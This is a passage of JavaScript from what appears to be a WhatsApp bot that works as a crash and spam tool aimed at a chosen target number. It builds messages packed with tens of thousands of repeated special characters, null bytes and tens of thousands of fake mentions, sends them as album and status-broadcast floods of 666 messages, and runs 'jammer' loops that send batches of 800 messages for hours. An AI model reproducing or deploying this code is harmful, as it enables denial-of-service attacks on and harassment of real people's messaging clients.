      streamingSidecar: "ifzqbbi6VQrr2qWUVcibCLLD5MublGIUI7VQWllrtSH0Oy9Oom8Fsw==",
      thumbnailDirectPath: "/v/t62.36147-24/597931020_1114136300619238_2132267882477762526_n.enc?ccb=11-4&oh=01_Q5Aa3QE3WwujMWlYXtHm0OsWvWU7G2iNPANw9Cpt64aOcOvNrg&oe=695F14B4&_nc_sid=5e03e0",
      thumbnailSha256: "ewOlFHMaQjWVM2MIHgdLESHC9lTe8wqHoRl5StiLkhM=",
      thumbnailEncSha256: "Vf7tqUV/U7cF064u4mVf9/b78ud+Ds3OS2AUwPOs5xE=",
      annotations: [
        {
          polygonVertices: [
            {
              x: 0.04808333143591881,
              y: 0.3758828043937683
            },
            {
              x: 0.9397777915000916,
              y: 0.3758828043937683
            },
            {
              x: 0.9397777915000916,
              y: 0.6241093873977661
            },
            {
              x: 0.04808333143591881,
              y: 0.6241093873977661
            }
          ],
          shouldSkipConfirmation: true,
          embeddedContent: {
            embeddedMessage: {
              stanzaId: "AC2FA3391836A5F431C9048A1146D3B5",
              message: {
                extendedTextMessage: {
                  text: "7eppeli.pdf",
                  previewType: "NONE",
                  inviteLinkGroupTypeV2: "DEFAULT"
                },
                messageContextInfo: {
                  messageSecret: "/M7rquUfS6CESB44pG4gkIEnJXmWCj0TWplGd5anYpI=",
                  messageAssociation: {
                    associationType: 16,
                    parentMessageKey: {
                      remoteJid: target,
                      fromMe: false,
                      id: "AC911EFEDA42DEA4586C4BB8C2814563",
                      participant: XeonBotInc.user.id
                    }
                  }
                }
              }
            }
          },
          embeddedAction: true
        },
        {
          polygonVertices: [
            {
              x: 0.2779604196548462,
              y: 0.3697652220726013
            },
            {
              x: 0.6993772983551025,
              y: 0.43257278203964233
            },
            {
              x: 0.6015534996986389,
              y: 0.6402503848075867
            },
            {
              x: 0.180136576294899,
              y: 0.5774427652359009
            }
          ],
          shouldSkipConfirmation: true,
          embeddedContent: {
            embeddedMusic: {
              musicContentMediaId: "1906813674047253",
              songId: "1137812656623908",
              author: "𑲱👁‍🗨꙰⃟".repeat(10000),
              title: "𑲱👁‍🗨꙰⃟".repeat(10000),
              artworkDirectPath: "/v/t62.76458-24/598391103_3273009980213184_2759326202399655865_n.enc?ccb=11-4&oh=01_Q5Aa3QGnx-UJjjZjgAcBWAO2Z_fjAVSkr6_6Trx2fPX0bUWq_Q&oe=695F194E&_nc_sid=5e03e0",
              artworkSha256: "r9BWAOUfrDCnp3bn+/bzOx1A966Z3CSpnemr24FtaV0=",
              artworkEncSha256: "RxkYiV5YBTTkodlBT20qVHazbrBipHBCLb5t9BWuaXo=",
              artistAttribution: "https://t.me/YuukeyD7eppeli",
              countryBlocklist: "UlU=",
              isExplicit: true,
              artworkMediaKey: "GuNInntcRnyNiYcZ28Ym4g8OeZz7JbNBHl6tPOL5BBA="
            }
          },
          embeddedAction: true
        }
      ]
    }
  }, { 
    participant: { jid:target }
  })
}

//==============================================================\\    

 async function loading(from) {
    {
        console.error("Invalid  from  JID:", from);
        return;
    }
    const Floading = [
        "ℓσα∂ιηg.",
        "ℓσα∂ιηg..",
        "ℓσα∂ιηg..."
    ];
    let { key } = await XeonBotInc.sendMessage(from, { text: " " });
    for (let i = 0; i < Floading.length; i++) {
        await XeonBotInc.sendMessage(from, { text: Floading[i], edit: key });
    }
}   

    async function sendMessagesForDurationX(durationHours, X) {
    const totalDurationMs = durationHours * 60 * 60 * 1000; // Convert hours to milliseconds
    const startTime = Date.now();
    let count = 0;

    const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs) {
            console.log("Delivery Completed Within Specified Duration.");
            return;
        }

        if (count < 800) {
            await xjammer(X); // Using X from user input
            count++;
            await sendNext(); // Continue shipping
        } else {
            console.log(chalk.green(`Completed Sending 800 Packages To ${X}`)); // Log completed sending 800 packages
            count = 0; // Reset for next package
            console.log(chalk.red("Preparing To Ship The Next 800 Packages..."));
            setTimeout(sendNext, 5000); // Pause 5 seconds after completion of batch of 800 messages
        }
    };

    sendNext();
};

async function sendMessagesForDuration(durationHours, X) {
    const totalDurationMs = durationHours * 60 * 60 * 1000; // Convert hours to milliseconds
    const startTime = Date.now();
    let count = 0;

    const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs) {
            console.log("Delivery Completed Within Specified Duration.");
            return;
        }

        if (count < 800) {
            await xjammer2(X); // Using X from user input
            count++;
            await sendNext(); // Continue delivery without delay between messages
        } else {
            console.log(chalk.green(`Completed Sending 800 Packages To ${X}`)); // Log selesai kirim 800 paket
            count = 0; // Reset for next package
            console.log(chalk.red("Preparing To Ship The Next 800 Packages..."));
            setTimeout(sendNext, 5000); // Pause 5 seconds after completion of batch of 800 messages
        }
    };

    sendNext();
};   
//==============================================================\\
async function albumbuggers1(target, mention) {

  const imageCrash = "https://files.catbox.moe/ykvioj.jpg";

  const mentionedMetaAi = [
    "13135550001@s.whatsapp.net",
    "13135550002@s.whatsapp.net",
    "13135550003@s.whatsapp.net",
    "13135550004@s.whatsapp.net",
    "13135550005@s.whatsapp.net",
    "13135550006@s.whatsapp.net",
    "13135550007@s.whatsapp.net",
    "13135550008@s.whatsapp.net",
    "13135550009@s.whatsapp.net",
    "13135550010@s.whatsapp.net"
  ];

  const photo = {
    image: { url: imageCrash },
    caption: "@𝗿𝗮𝗹𝗱𝘇𝘇𝘅𝘆𝘇 • #𝗯𝘂𝗴𝗴𝗲𝗿𝘀 🩸" 
             + "\n".repeat(5)
             + "ꦾ".repeat(60000)
  };

  const album = await generateWAMessageFromContent(target, {
    albumMessage: {
      expectedImageCount: 999,
      expectedVideoCount: 666
    }
  }, {
    userJid: target,
    upload: XeonBotInc.waUploadToServer
  });

  await XeonBotInc.relayMessage(target, album.message, { messageId: album.key.id });

  for (let i = 0; i < 666; i++) {
    const msg = await generateWAMessage(target, photo, {
      upload: XeonBotInc.waUploadToServer
    });

    const type = Object.keys(msg.message).find(t => t.endsWith('Message'));

    msg.message[type].contextInfo = {
      mentionedJid: [
        ...mentionedMetaAi,
        ...Array.from({ length: 30000 }, () =>
          `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
      ],
      businessMessageForwardInfo: {
        businessOwnerJid: "5521992999999@s.whatsapp.net"
      },
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      forwardedNewsletterMessageInfo: {
        newsletterName: "ꦾ".repeat(100),
        newsletterJid: "120363330344810280@newsletter",
        serverMessageId: 999
      },
      messageAssociation: {
        associationType: 1,
        parentMessageKey: album.key
      }
    };

    msg.message.nativeFlowMessage = {
      buttons: [
        {
          type: "call_button",
          callButton: {
            displayText: "ꦽ".repeat(9999),
            phoneNumber: "+5521992999999"
        }
      },
      {
          type: "url",
          urlButton: {
            displayText: "ꦽ".repeat(9999),
            url: "https://wa.me/+5521992999999?text=" + encodeURIComponent("ꦾ".repeat(66666))
        }
      },
      {
          type: "unknown_type",
          weirdButton: {
            displayText: "ꦽ".repeat(9999),
            payload: "\u0000".repeat(9999)
        }
      },
    ],
      content: {
        namespace: "call_permission_request_namespace",
        name: "call_permission_request",
          params: [
            { 
              name: "call_type",
              value: "video" 
            },
            { 
              name: "permission_reason", 
              value: "\u0000".repeat(9999) 
            },
            {
              name: "support_url", 
              value: "https://wa.me/+5521992999999" 
            }
        ]
      }
    };

    await XeonBotInc.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    if (mention) {
      await XeonBotInc.relayMessage(target, {
        statusMentionMessage: {
          message: { protocolMessage: { key: msg.key, type: 25 } }
        }
      }, {
        additionalNodes: [
          { tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }
        ]
      });
    }
  }
}

async function albumbuggers2(target, mention) {
  const imageCrash = "https://files.catbox.moe/ykvioj.jpg";

  const mentionedMetaAi = [
    "13135550001@s.whatsapp.net",
    "13135550002@s.whatsapp.net",
    "13135550003@s.whatsapp.net",
    "13135550004@s.whatsapp.net",
    "13135550005@s.whatsapp.net",
    "13135550006@s.whatsapp.net",
    "13135550007@s.whatsapp.net",
    "13135550008@s.whatsapp.net",
    "13135550009@s.whatsapp.net",
    "13135550010@s.whatsapp.net"
  ];

  const photo = {
    image: { url: imageCrash },
    caption: "@𝗿𝗮𝗹𝗱𝘇𝘇𝘅𝘆𝘇 • #𝗯𝘂𝗴𝗴𝗲𝗿𝘀 🩸" 
             + "\n".repeat(5)
             + "ꦾ".repeat(60000)
  };

  const album = await generateWAMessageFromContent(target, {
    albumMessage: {
      expectedImageCount: 999,
      expectedVideoCount: 666
    }
  }, {
    userJid: target,
    upload: XeonBotInc.waUploadToServer
  });

  await XeonBotInc.relayMessage(target, album.message, { messageId: album.key.id });

  for (let i = 0; i < 666; i++) {
    const msg = await generateWAMessage(target, photo, {
      upload: XeonBotInc.waUploadToServer
    });

    const type = Object.keys(msg.message).find(t => t.endsWith('Message'));

    msg.message[type].contextInfo = {
      mentionedJid: [
        ...mentionedMetaAi,
        ...Array.from({ length: 40000 }, () =>
          `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
      ],
      businessMessageForwardInfo: {
        businessOwnerJid: "5521992999999@s.whatsapp.net"
      },
      participant: "0@s.whatsapp.net",
      remoteJid: target,
      forwardedNewsletterMessageInfo: {
        newsletterName: "ꦾ".repeat(100),
        newsletterJid: "120363330344810280@newsletter",
        serverMessageId: 999
      },
      messageAssociation: {
        associationType: 1,
        parentMessageKey: album.key
      }
    };

    msg.message.nativeFlowMessage = {
      buttons: [
        {
          type: "call_button",
          callButton: {
            displayText: "ꦽ".repeat(9999),
            phoneNumber: "+5521992999999"
          }
        },
        {
          type: "url",
          urlButton: {
            displayText: "ꦽ".repeat(9999),
            url: "https://wa.me/+5521992999999?text=" + encodeURIComponent("ꦾ".repeat(66666))
          }
        },
        {
          type: "unknown_type",
          weirdButton: {
            displayText: "ꦽ".repeat(9999),
            payload: "\u0000".repeat(9999)
          }
        }
      ],
      content: {
        namespace: "call_permission_request_namespace",
        name: "call_permission_request",
        params: [
            { 
              name: "call_type",
              value: "video" 
            },
            { 
              name: "permission_reason", 
              value: "\u0000".repeat(9999) 
            },
            {
              name: "support_url", 
              value: "https://wa.me/+5521992999999" 
            }
        ]
      }
    };
